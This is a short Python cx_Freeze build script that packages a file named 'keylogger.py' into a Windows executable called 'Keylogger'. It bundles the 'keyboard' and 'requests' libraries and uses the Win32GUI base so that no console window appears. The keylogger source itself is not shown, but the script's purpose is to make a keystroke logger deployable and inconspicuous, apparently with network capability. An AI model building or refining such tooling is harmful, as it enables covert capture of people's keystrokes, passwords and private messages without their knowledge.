from cx_Freeze import setup, Executable
import sys

# Define the application details
build_exe_options = {
    "packages": ["requests", "keyboard"],
    "excludes": [],
    "include_files": [],  # If you have additional files to include
    "optimize": 2
}

# If you want a console window, use "Console"
# If you want no console window (GUI), use "Win32GUI"
base = None
if sys.platform == "win32":
    base = "Win32GUI"  # For GUI applications

setup(
    name="Keylogger",
    version="1.0",
    description="Keylogger application",
    options={"build_exe": build_exe_options},
    executables=[Executable("keylogger.py", base=base)]
)
